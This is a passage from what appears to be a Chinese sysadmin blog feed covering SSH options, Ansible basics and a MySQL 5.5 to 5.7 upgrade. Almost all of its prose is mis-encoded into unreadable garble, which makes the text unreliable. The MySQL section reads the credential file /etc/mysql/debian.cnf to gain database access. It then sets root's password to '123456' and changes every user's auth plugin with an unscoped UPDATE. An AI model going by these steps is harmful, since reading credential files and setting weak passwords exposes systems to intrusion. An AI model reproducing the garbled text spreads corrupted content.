192.168.0.116</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œè¿™ä¸ªé€‰é¡¹åœ¨ç½‘é€Ÿä¸æ˜¯å¾ˆå¿«çš„æ—¶å€™æ¯”è¾ƒæœ‰ç”¨ï¼Œè€Œå½“ç½‘é€Ÿè¾ƒå¿«çš„æ—¶å€™ï¼Œä½¿ç”¨å‹ç¼©åè€Œä¼šé™ä½æ•ˆç‡ï¼Œæ‰€ä»¥è¦è§†æƒ…å†µä½¿ç”¨ã€‚</p><h3 id="æ‰“å¼€è°ƒè¯•æ¨¡å¼"><a href="#æ‰“å¼€è°ƒè¯•æ¨¡å¼" class="headerlink" title="æ‰“å¼€è°ƒè¯•æ¨¡å¼"></a>æ‰“å¼€è°ƒè¯•æ¨¡å¼</h3><p>å› ä¸ºæŸäº›åŸå› ï¼Œæˆ‘ä»¬æƒ³è¦è¿½è¸ªè°ƒè¯•æˆ‘ä»¬å»ºç«‹çš„ SSH è¿æ¥æƒ…å†µã€‚SSH æä¾›çš„ -v é€‰é¡¹å‚æ•°æ­£æ˜¯ä¸ºæ­¤è€Œè®¾çš„ã€‚å…¶å¯ä»¥çœ‹åˆ°åœ¨å“ªä¸ªç¯èŠ‚å‡ºäº†é—®é¢˜ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Alvin.Alvin-computer] â¤ ssh -v pi@192.168.0.116</span><br><span class="line">OpenSSH_7.1p2, OpenSSL 1.0.1g 7 Apr 2014</span><br><span class="line">debug1: Reading configuration data /etc/ssh_config</span><br><span class="line">debug1: Connecting to 192.168.0.116 [192.168.0.116] port 22.</span><br><span class="line">debug1: Connection established.</span><br><span class="line">debug1: key_load_public: No such file or directory</span><br><span class="line">debug1: Enabling compatibility mode <span class="keyword">for</span> protocol 2.0</span><br><span class="line">debug1: Local version string SSH-2.0-OpenSSH_7.1</span><br><span class="line">debug1: Remote protocol version 2.0, remote software version OpenSSH_7.4p1 Raspbian-10+deb9u4</span><br><span class="line">debug1: match: OpenSSH_7.4p1 Raspbian-10+deb9u4 pat OpenSSH* compat 0x04000000</span><br><span class="line">debug1: Authenticating to 192.168.0.116:22 as <span class="string">&#x27;pi&#x27;</span></span><br><span class="line">debug1: SSH2_MSG_KEXINIT sent</span><br><span class="line">debug1: SSH2_MSG_KEXINIT received</span><br></pre></td></tr></table></figure><h3 id="ç»‘å®šæºåœ°å€"><a href="#ç»‘å®šæºåœ°å€" class="headerlink" title="ç»‘å®šæºåœ°å€"></a>ç»‘å®šæºåœ°å€</h3><p>å¦‚æœä½ çš„å®¢æˆ·ç«¯æœ‰å¤šäºä¸¤ä¸ªä»¥ä¸Šçš„ IP åœ°å€ï¼Œä½ å°±ä¸å¯èƒ½åˆ†å¾—æ¸…æ¥šåœ¨ä½¿ç”¨å“ªä¸€ä¸ª IP è¿æ¥åˆ° SSH æœåŠ¡å™¨ã€‚ä¸ºäº†è§£å†³è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ -b é€‰é¡¹æ¥æŒ‡å®šä¸€ä¸ªIP åœ°å€ã€‚è¿™ä¸ª IP å°†ä¼šè¢«ä½¿ç”¨åšå»ºç«‹è¿æ¥çš„æºåœ°å€ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Alvin.Alvin-computer] â¤ ssh -b 192.168.0.105 pi@192.168.0.116</span><br><span class="line">Linux raspberrypi 4.14.71-v7+ <span class="comment">#1145 SMP Fri Sep 21 15:38:35 BST 2018 armv7l</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Feb 24 08:52:29 2019 from 192.168.0.105</span><br></pre></td></tr></table></figure><h3 id="è¿œç¨‹æ‰§è¡Œå‘½ä»¤"><a href="#è¿œç¨‹æ‰§è¡Œå‘½ä»¤" class="headerlink" title="è¿œç¨‹æ‰§è¡Œå‘½ä»¤"></a>è¿œç¨‹æ‰§è¡Œå‘½ä»¤</h3><p>å¦‚æœæˆ‘ä»¬æƒ³åœ¨ç›®æ ‡ä¸»æœºæ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼Œæˆ‘ä»¬é€šå¸¸çš„åšæ³•æ˜¯ï¼Œå…ˆç™»å½•åˆ°ç›®æ ‡ä¸»æœºï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œå†é€€å‡ºæ¥ã€‚è¿™æ ·åšå½“ç„¶æ˜¯å¯ä»¥ï¼Œä½†æ˜¯æ¯”è¾ƒéº»çƒ¦ã€‚</p><p>å¦‚æœæˆ‘ä»¬ä»…ä»…æ˜¯æƒ³è¿œç¨‹æ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼Œå¯ä»¥ç›´æ¥åœ¨åé¢è·Ÿä¸Šå‘½ä»¤å°±å¥½ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Alvin.Alvin-computer] â¤ ssh pi@192.168.0.116 ls -l</span><br><span class="line">Desktop</span><br><span class="line">Documents</span><br><span class="line">Downloads</span><br><span class="line">MagPi</span><br><span class="line">Music</span><br></pre></td></tr></table></figure><h3 id="æŒ‚è½½è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿ"><a href="#æŒ‚è½½è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="æŒ‚è½½è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿ"></a>æŒ‚è½½è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿ</h3><p>å¦å¤–ä¸€ä¸ªå¾ˆèµçš„åŸºäº SSH çš„å·¥å…·å« sshfsã€‚ sshfs å¯ä»¥è®©ä½ åœ¨æœ¬åœ°ç›´æ¥æŒ‚è½½è¿œç¨‹ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿã€‚å®ƒçš„ä½¿ç”¨æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshfs -o idmap=user user@hostname:/home/user ~/Remote</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshfs -o idmap=user pi@192.168.0.116:/home/pi ~/Pi</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‘½ä»¤å¯ä»¥å°†è¿œç¨‹ä¸»æœº pi ç”¨æˆ·çš„ä¸»ç›®å½•æŒ‚è½½åˆ°æœ¬åœ°ä¸»ç›®å½•ä¸‹çš„ Pi æ–‡ä»¶å¤¹ã€‚</p><h4 id="ç±»ä¼¼æ–‡ç« "><a href="#ç±»ä¼¼æ–‡ç« " class="headerlink" title="ç±»ä¼¼æ–‡ç« "></a>ç±»ä¼¼æ–‡ç« </h4><p><a href="https://mp.weixin.qq.com/s?__biz=MzU3NTgyODQ1Nw==&mid=2247485113&idx=1&sn=abea3f5747ab3de98304af6cb3cbc284&chksm=fd1c7e3fca6bf729240929b5e601689224cfa45af3d85687d526a933b9230c49ac4e71219fee&mpshare=1&scene=1&srcid=&key=b2c45c44f63c475036caf81458c44270265fe62073129d3613733350f1782404341d5c22f720910d41ea6434cd634cf4ace07220484616551b1cbda27b5a4c50fe20f488447cfec1c7922f7ad81b7fa4&ascene=1&uin=MjMxMTMxNDIxMw==&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=Ks6ARNaAyjOn+MDn0BlfGaZi3QgnAKBugECR9dT+pk7bVXvF/R+0jnIDyFwuIf9P">è‰¯è®¸Linux æ’é™¤Linuxæœºå™¨æ˜¯å¦è¢«å…¥ä¾µ</a></p>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
          <category> SSH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆè¯† ansible (ä¸€)</title>
      <link href="2019/07/06/%E5%88%9D%E8%AF%86-ansible-1/"/>
      <url>2019/07/06/%E5%88%9D%E8%AF%86-ansible-1/</url>
      
        <content type="html"><![CDATA[<h3 id="ä¸ªäººè¸©æ»´å°å‘"><a href="#ä¸ªäººè¸©æ»´å°å‘" class="headerlink" title="ä¸ªäººè¸©æ»´å°å‘"></a>ä¸ªäººè¸©æ»´å°å‘</h3><p>è¦æ³¨æ„ä¸‹ä¸‹, ä¸€äº›å‚æ•°çš„å«ä¹‰æ˜¯ä»€ä¹ˆ, å¥½æ¯”æˆ‘è°ƒç”¨ script æ¨¡å—, æƒ³æŠŠè„šæœ¬è°ƒç”¨åˆ°ç›®æ ‡æœåŠ¡å™¨å»æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- name: backup base system version</span><br><span class="line">    script: /baseVersionBackup.sh ä¼ å…¥è„šæœ¬å‚æ•°1, 2, 3....</span><br></pre></td></tr></table></figure><p>â€œæœºæ™ºâ€ çš„æˆ‘ä»¥ä¸ºè¿™æ˜¯åˆ°å¯¹æ–¹æœåŠ¡å™¨çš„æ ¹ç›®å½•æ‰§è¡Œè„šæœ¬â€¦.emmmmmm<br>** æ³¨æ„ chdir æ˜¯è„šæœ¬åœ¨å¯¹æ–¹æœåŠ¡å™¨æ‰§è¡Œçš„ç›®å½•, baseVersionBackup.sh æ˜¯ä½ æœ¬æœºè„šæœ¬çš„ä½ç½® **</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ­£ç¡®æ“ä½œ</span></span><br><span class="line">- name: backup base system version</span><br><span class="line">    script: <span class="built_in">chdir</span>=/ baseVersionBackup.sh ä¼ å…¥è„šæœ¬å‚æ•°1, 2, 3....</span><br></pre></td></tr></table></figure><h3 id="ansible-åŸºäºkeyçš„éªŒè¯æ˜¯ä¸€åŸºæœ¬è¦æ±‚"><a href="#ansible-åŸºäºkeyçš„éªŒè¯æ˜¯ä¸€åŸºæœ¬è¦æ±‚" class="headerlink" title="ansible: åŸºäºkeyçš„éªŒè¯æ˜¯ä¸€åŸºæœ¬è¦æ±‚"></a>ansible: åŸºäºkeyçš„éªŒè¯æ˜¯ä¸€åŸºæœ¬è¦æ±‚</h3><h3 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§:"></a>ç‰¹æ€§:</h3><ul><li>æ¨¡å—åŒ–</li><li>æœ‰Paramiko, PyYAML, Jinja2(æ¨¡å—è¯­è¨€)ä¸‰ä¸ªå…³é”®æ¨¡å—</li><li>æ”¯æŒè‡ªå®šä¹‰æ¨¡å—</li><li>åŸºäºpythonå®ç°</li><li>éƒ¨ç½²ç®€å•ï¼ŒåŸºäºpythonå’Œssh(é»˜è®¤å·²å®‰è£…), agentless</li><li>å®‰å…¨, åŸºäºOpenSSH</li><li>æ”¯æŒplaybookç¼–æ’ä»»åŠ¡</li><li>å¹‚ç­‰æ€§: ä¸€ä¸ªä»»åŠ¡æ‰§è¡Œä¸€éå’Œæ‰§è¡Œné, ä¸å› é‡å¤æ‰§è¡Œå¸¦æ¥æ„å¤–æƒ…å†µ</li><li>æ— éœ€ä»£ç†ä¸ä¾èµ–PKI(æ— éœ€ssl)</li><li>å¯ä½¿ç”¨ä»»ä½•å˜æˆè¯­è¨€å†™æ¨¡å—</li><li>YAMLæ ¼å¼ï¼Œç¼–æ’ä»»åŠ¡ï¼Œæ”¯æŒä¸°å¯Œçš„æ•°æ®ç»“æ„</li><li>è¾ƒå¼ºå¤§çš„å¤šå±‚è§£å†³æ–¹æ¡ˆ</li></ul><h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><ul><li><p>/etc/ansible/ansible.cfg ä¸»é…ç½®æ–‡ä»¶ï¼Œé…ç½®ansibleå·¥ä½œç‰¹æ€§(ä¸€èˆ¬ä¿æŒé»˜è®¤)<br>  ä¸ºä»€ä¹ˆæˆ‘æ‰§è¡Œçš„ansibleæŒ‡ä»¤å¯¹æ–¹å°±èƒ½æ‰§è¡Œï¼Ÿ(tmpæ‰§è¡Œå®Œä¼šåˆ é™¤)</p><ul><li>è„šæœ¬çš„ä¸´æ—¶ç›®å½•:<br>remote_tmp  = ~/.ansible/tmp<br>local_tmp   = ~/.ansible/tmp</li></ul><ul><li>forks å¹¶å‘æ‰§è¡Œ</li><li>poll_interval å¤šé•¿æ—¶é—´å»æ‹‰ä¸€æ¬¡æ•°æ®</li><li>sudo_user é»˜è®¤ç”¨æˆ·</li><li>ask_sudo_pass æ˜¯å¦è¯¢é—®å£ä»¤</li><li>ask_pass    æ˜¯å¦æ”¯æŒå£ä»¤</li><li>host_key_checking æ˜¯å¦æ£€æŸ¥å¯¹åº”æœåŠ¡å™¨çš„host_key, å»ºè®®å–æ¶ˆæ³¨é‡Š</li><li>log_path    æ—¥å¿—å»ºè®®æ‰“å¼€</li></ul></li><li><p>/etc/ansible/hosts ä¸»æœºæ¸…å•<br>  åˆ†ç»„:<br>  [webserver]<br>  # å†™åŸŸåéœ€è¦å€ŸåŠ©dnså»è§£æ<br>  10.10.0.1[18:20]<br>  10.10.0.92:8080<br>  www[01:100].example.com<br>  db-[a:f].example.com</p></li><li><p>sshåŸºäºkeyéªŒè¯:<br>  ssh-keygen è¾“å…¥å®ŒååŠ ä¸€ä¸‹ç§˜é’¥<br>  ssh-copy-id ipåœ°å€</p></li><li><p>Host-pattern:<br>  ALLã€é€šé…ç¬¦*<br>  æˆ–å…³ç³»ï¼Œå¦‚: ansible â€œgroup1:group2â€ æˆ–è€… ansible â€œip1:ip2â€<br>  ä¸å…³ç³»ï¼Œå¦‚: ansible â€œgroup1:&amp;group2â€ ä¸¤ä¸ªç»„éƒ½åœ¨çš„ä¸»æœº<br>  éå…³ç³»ï¼Œå¦‚: ansible â€œgroup1:!group2â€ åœ¨ç»„1ä¸åœ¨ç»„2<br>  ç»¼åˆå…³ç³»,å¦‚: ansible â€œgroup1:group2:&amp;group3:!group4â€<br>  æ­£åˆ™è¡¨è¾¾å¼ â€œ~(web|file).*\.fosu\.comâ€<br>  /etc/ansible/roles/ å­˜æ”¾è§’è‰²çš„ç›®å½•</p></li></ul><h3 id="ç¨‹åº"><a href="#ç¨‹åº" class="headerlink" title="ç¨‹åº"></a>ç¨‹åº</h3><ul><li>/usr/bin/ansible ä¸»ç¨‹åºï¼Œä¸´æ—¶å‘½ä»¤æ‰§è¡Œå·¥å…·<br>  â€“version<br>  -m æ¨¡å— é»˜è®¤command ä¾‹å¦‚ping<br>  -a æ¨¡å—å‚æ•°<br>  -v -vv -vvv<br>  â€“list-hosts æ˜¾ç¤ºä¸»æœºåˆ—è¡¨<br>  -k æç¤ºè¾“å…¥sshè¿æ¥å¯†ç ï¼Œé»˜è®¤KeyéªŒè¯<br>  -K æç¤ºè¾“å…¥sudoæ—¶çš„å£ä»¤<br>  -C æ£€æŸ¥ï¼Œå¹¶ä¸æ‰§è¡Œ<br>  -T TIMEOUT é»˜è®¤10s<br>  -u æ‰§è¡Œè¿œç¨‹æ‰§è¡Œçš„ç”¨æˆ·<br>  -b sudo</li><li>/usr/bin/ansible-doc æŸ¥çœ‹é…ç½®æ–‡æ¡£ï¼Œæ¨¡å—åŠŸèƒ½æŸ¥çœ‹å·¥å…·<br>  -a å¯ä»¥åˆ—å‡ºå½“å‰æ¨¡å—åˆ—è¡¨ï¼Œå¾ˆå¤šâ€¦<br>  -l æ¯”è¾ƒå¸¸ç”¨ ansible-doc -l ping<br>  -s ç‰‡æ®µè§£é‡Š<br>  æ‰§è¡Œè¿‡ç¨‹:<pre><code>  1.åŠ è½½è‡ªå·±çš„é…ç½®æ–‡ä»¶ é»˜è®¤/etc/ansible/ansible.cfg  2.åŠ è½½è‡ªå·±å¯¹åº”çš„æ¨¡å—æ–‡ä»¶,å¦‚command  3.é€šè¿‡ansibleå°†æ¨¡å—æˆ–å‘½ä»¤ç”Ÿæˆå¯¹åº”çš„ä¸´æ—¶pyæ–‡ä»¶å¹¶å°†è¯¥æ–‡ä»¶ä¼ è¾“è‡³è¿œç¨‹æœåŠ¡å™¨çš„å¯¹åº”æ‰§è¡Œç”¨æˆ·      $HOME/.ansible/tmp/ansible-tmp-æ•°ç»„/xxx.pyæ–‡ä»¶  4.ç»™æ–‡ä»¶+xæ‰§è¡Œ  5.æ‰§è¡Œå¹¶è¿”å›ç»“æœ  6.åˆ é™¤ä¸´æ—¶pyæ–‡ä»¶, sleep 0é€€å‡º</code></pre>  æ‰§è¡ŒçŠ¶æ€:<pre><code>  ç»¿è‰²:æ‰§è¡ŒæˆåŠŸå¹¶ä¸”ä¸éœ€è¦åšæ”¹å˜çš„æ“ä½œ  é»„è‰²:æ‰§è¡ŒæˆåŠŸå¹¶ä¸”å¯¹ç›®æ ‡ä¸»æœºåšå˜æ›´  çº¢è‰²:æ‰§è¡Œå¤±è´¥</code></pre></li><li>/usr/bin/ansible-galaxy ä¸‹è½½/ä¸Šä¼ ä¼˜ç§€ä»£ç æˆ–Rolesæ¨¡å—çš„å®˜ç½‘å¹³å°</li><li>/usr/bin/ansible-playbook å®šåˆ¶è‡ªåŠ¨åŒ–ä»»åŠ¡ï¼Œç¼–æ’å‰§æœ¬å·¥å…·/usr/bin/ansible-pullè¿œç¨‹æ‰§è¡Œå‘½ä»¤å·¥å…·</li><li>/usr/bin/ansible-valut æ–‡ä»¶åŠ å¯†å·¥å…·</li><li>/usr/bin/ansible-console åŸºäºConsoleç•Œé¢ä¸ç”¨æˆ·äº¤äº’çš„æ‰§è¡Œå·¥å…·</li></ul><h3 id="è‡ªåŠ¨åŒ–è¿ç»´åº”ç”¨åœºæ™¯"><a href="#è‡ªåŠ¨åŒ–è¿ç»´åº”ç”¨åœºæ™¯" class="headerlink" title="è‡ªåŠ¨åŒ–è¿ç»´åº”ç”¨åœºæ™¯"></a>è‡ªåŠ¨åŒ–è¿ç»´åº”ç”¨åœºæ™¯</h3><ul><li>æ–‡ä»¶ä¼ è¾“</li><li>å‘½ä»¤æ‰§è¡Œ<br>  åº”ç”¨éƒ¨ç½²<br>  é…ç½®ç®¡ç†<br>  ä»»åŠ¡æµç¼–æ’</li><li>å·¥å…·ï¼š<br>  Ansible é€‚åˆä¸­å°å‹ä¼ä¸š<br>  Puppet é€‚åˆå¤§å‹å…¬å¸ï¼Œä¾‹å¦‚è°·æ­Œ</li></ul><h3 id="ç›¸å…³æ¦‚å¿µï¼š"><a href="#ç›¸å…³æ¦‚å¿µï¼š" class="headerlink" title="ç›¸å…³æ¦‚å¿µï¼š"></a>ç›¸å…³æ¦‚å¿µï¼š</h3><p>ä»£ç å‘å¸ƒæœº(å ¡å’æœº)é€šå¸¸å­˜åœ¨å‘å¸ƒç¯å¢ƒä¸­ï¼šè´Ÿè´£æŠŠåœ¨å¼€å‘å®Œæˆç»æµ‹è¯•æ²¡é—®é¢˜åå‘å¸ƒåˆ°ç”Ÿäº§ç¯å¢ƒä¸­<br>é€šå¸¸éœ€è¦2å°(ä¸»å¤‡)</p>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
          <category> ansible </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> ansible </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL upgrade, from 5.5.* to 5.7.*</title>
      <link href="2019/07/03/MySQL_upgrade_from_5.5.*_to_5.7.*/"/>
      <url>2019/07/03/MySQL_upgrade_from_5.5.*_to_5.7.*/</url>
      
        <content type="html"><![CDATA[<h3 id="æœåŠ¡å™¨ç‰ˆæœ¬-Ubuntu14-04"><a href="#æœåŠ¡å™¨ç‰ˆæœ¬-Ubuntu14-04" class="headerlink" title="æœåŠ¡å™¨ç‰ˆæœ¬ Ubuntu14.04"></a>æœåŠ¡å™¨ç‰ˆæœ¬ Ubuntu14.04</h3><h3 id="å¤‡ä»½-å¿«ç…§"><a href="#å¤‡ä»½-å¿«ç…§" class="headerlink" title="å¤‡ä»½(å¿«ç…§)"></a>å¤‡ä»½(å¿«ç…§)</h3><h3 id="æ—¥å¸¸å¿˜è®°å¯†ç -çŸ¥é“å¯†ç æ»´è¯·ç›´æ¥è·³è‡³-å¼€å§‹å‡çº§è‡³5-7"><a href="#æ—¥å¸¸å¿˜è®°å¯†ç -çŸ¥é“å¯†ç æ»´è¯·ç›´æ¥è·³è‡³-å¼€å§‹å‡çº§è‡³5-7" class="headerlink" title="æ—¥å¸¸å¿˜è®°å¯†ç  -,- (çŸ¥é“å¯†ç æ»´è¯·ç›´æ¥è·³è‡³ å¼€å§‹å‡çº§è‡³5.7.* )"></a>æ—¥å¸¸å¿˜è®°å¯†ç  -,- (çŸ¥é“å¯†ç æ»´è¯·ç›´æ¥è·³è‡³ å¼€å§‹å‡çº§è‡³5.7.* )</h3><p>ä»‹ç»ä¸€ä¸ªç®€å•ä¿®æ”¹æ•°æ®åº“å¯†ç çš„æ–¹æ³•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /etc/mysql/debian.cnf </span><br></pre></td></tr></table></figure><p>çº¢çº¿é€‰ä¸­éƒ¨åˆ†ä¸ºæˆ‘æœ¬åœ°mysqlçš„ç”¨æˆ·å’Œå¯†ç (<strong>passwordéƒ¨åˆ†æ¯ä¸ªäººä¸åŒçš„å–”!</strong>)<br><img src="/img/Linux_Server_Maintenance/mysqlForgetPass1.png" class="lazyload" data-srcset="/img/Linux_Server_Maintenance/mysqlForgetPass1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="pass"><br>å­˜åœ¨mysqlçš„debian-sys-maintç”¨æˆ·å’Œå¯†ç ,é‚£ä»–ä»¬æ˜¯æ€ä¹ˆæ¥çš„å‘¢?</p><p>å…ˆå‡ç§‘æ™®ä¸€æ³¢, æ­£å¦‚å®ƒçš„å­—é¢æ„æ€ï¼ˆDebian System Matainenceï¼‰ï¼ŒDebianç³»ç»Ÿå¯¹MySQLç»´æŠ¤ç”¨çš„ï¼Œä½ å¯ä»¥ç†è§£ä¸ºé€šè¿‡ç³»ç»Ÿçš„æŸä¸ª â€œéå¸¸è§„â€ ç¨‹åºå¯¹Mysqlè¿›è¡Œå¤‡ä»½æ¢å¤ç­‰è¡Œä¸ºæ—¶ï¼Œè¯¥ç¨‹åºæ‰€ä½¿ç”¨çš„ç™»å½•Mysqlçš„è´¦æˆ·ã€‚</p><p>ä½¿ç”¨ä»¥ä¸Šè´¦å·å¯†ç ç™»å½•è‡³mysqlæ‰§è¡Œä¸‹é¢ä¸‰æ¡å‘½ä»¤å°±å¯ä»¥æŠŠå¯†ç æ›´æ”¹ä¸º 123456å•¦!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line"></span><br><span class="line">update user <span class="built_in">set</span> authentication_string=password(<span class="string">&#x27;123456&#x27;</span>) <span class="built_in">where</span> user=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"></span><br><span class="line">update user <span class="built_in">set</span> plugin=<span class="string">&#x27;mysql_native_password&#x27;</span>;</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>ç™»å½•éªŒè¯ä¸‹å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><h3 id="å¼€å§‹å‡çº§è‡³5-7"><a href="#å¼€å§‹å‡çº§è‡³5-7" class="headerlink" title="å¼€å§‹å‡çº§è‡³5.7.*"></a>å¼€å§‹å‡çº§è‡³5.7.*</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œaptæ˜¯æ— æ³•ç›´æ¥å‡çº§åˆ°mysql5.7çš„ï¼Œå› æ­¤éœ€è¦é¢å¤–è®¾ç½®</p><p>é¦–å…ˆï¼Œå¤‡ä»½æ•°æ®ï¼Œå°½ç®¡ä¸‹é¢çš„æ–¹å¼ä¸ä¼šä¸¢å¤±ä½ çš„æ•°æ®ï¼Œä½†æ˜¯ä¸ºäº†å®‰å…¨è€ƒè™‘ï¼Œå»ºè®®å¤‡ä»½ã€‚</p><ul><li>ä¸‹è½½mysql-aptçš„é…ç½®åŒ…ï¼Œå¹¶å®‰è£…</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://dev.mysql.com/get/mysql-apt-config_0.8.1-1_all.deb</span><br><span class="line"></span><br><span class="line">sudo dpkg -i mysql-apt-config_0.8.1-1_all.deb</span><br></pre></td></tr></table></figure><p>åœ¨å®‰è£…çš„è¿‡ç¨‹ä¸­ï¼Œä¼šè¦æ±‚é€‰æ‹©mysqlç‰ˆæœ¬ï¼Œé€‰æ‹©mysql5.7ç‰ˆæœ¬åï¼Œç‚¹å‡»â€œOKâ€ã€‚</p><ul><li>æ›´æ–°æºå¹¶å®‰è£…æ•°æ®åº“ï¼Œåœ¨å®‰è£…è¿‡ç¨‹ä¸­ï¼Œä¼šè‡ªåŠ¨å¸è½½å·²ç»å®‰è£…çš„è€ç‰ˆæœ¬æ•°æ®ã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install mysql-server</span><br></pre></td></tr></table></figure><ul><li>å®‰è£… mysql åï¼Œä½¿ç”¨mysql_upgradeå‡çº§æ•°æ®åº“æ–‡ä»¶ç‰ˆæœ¬(å¿…é¡»æ˜¯rootç”¨æˆ·å–”!)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql_upgrade -uroot -p</span><br></pre></td></tr></table></figure><ul><li>é‡å¯mysql,å¹¶æ£€æŸ¥æ•°æ®æ˜¯å¦æ­£å¸¸</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service mysql restart</span><br><span class="line"></span><br><span class="line">mysqlcheck -uroot -p --all-databases</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œæ‰€æœ‰è¡¨çš„æ£€æŸ¥ç»“æœå‡æ˜¯okçŠ¶æ€ã€‚</li></ul><p>åŒæ—¶ï¼Œä¹Ÿå¯ä»¥è¿›å…¥mysqlä½¿ç”¨select version()ï¼› æ¥æŸ¥çœ‹mysql-server ç‰ˆæœ¬å·ã€‚</p><h3 id="æ›´æ–°è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ï¼š"><a href="#æ›´æ–°è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ï¼š" class="headerlink" title="æ›´æ–°è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ï¼š"></a>æ›´æ–°è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ï¼š</h3><ul><li>åœ¨ubuntu 14çš„ç‰ˆæœ¬ä¸­ï¼Œå®‰è£…äº†mysql åï¼Œå¯åŠ¨æ—¶ï¼Œç¨‹åºæç¤º â€œNo directory, logging in with HOME=/â€ã€‚ å…·ä½“å¦‚ä¸‹ï¼š</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@xxx:/etc/mysql<span class="comment"># service mysql restart</span></span><br><span class="line"> \* Stopping MySQL Community Server 